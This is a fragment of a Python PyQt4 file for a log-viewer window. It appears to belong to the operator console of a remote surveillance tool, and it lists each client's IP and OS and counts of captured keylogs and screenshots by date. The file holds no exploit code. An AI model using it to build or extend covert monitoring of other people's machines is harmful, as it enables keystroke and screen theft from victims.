from ui.logViewer import Ui_Form as logViewerUi
from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs.data_transfer import data_get, data_send
from language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class LogViewer(QWidget, logViewerUi):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.socket = args['sock']
        self.client_id = args['key']
        self.client_alias = args['alias']
        self.client_ip_address = args['ip_address']
        self.client_os = args['os']
        self.session_id = args['session_id']

        self.date = str(self.timeCalendar.selectedDate().toPyDate())

        self.timeCalendar.clicked.connect(self.check_data_counts)

        self.init_ui()
        self.check_data_counts()

    def init_ui(self):
        self.clientIdLine.setText(self.client_id)
        self.clientAliasLine.setText(self.client_alias)
        self.clientIpLine.setText(self.client_ip_address)
        self.clientOsLine.setText(self.client_os)

    def update_date(self):
        self.date = str(self.timeCalendar.selectedDate().toPyDate())

    def check_data_counts(self):
        self.update_date()

        # Check Screenshots
        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countScreenshots', session_id=self.session_id)
        self.screenshotsCountLabel.setText(data['payload'])

        # Check Keylogs
        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countKeylogs', session_id=self.session_id)
        self.keylogsCountLabel.setText(data['payload'])

        # Check Audio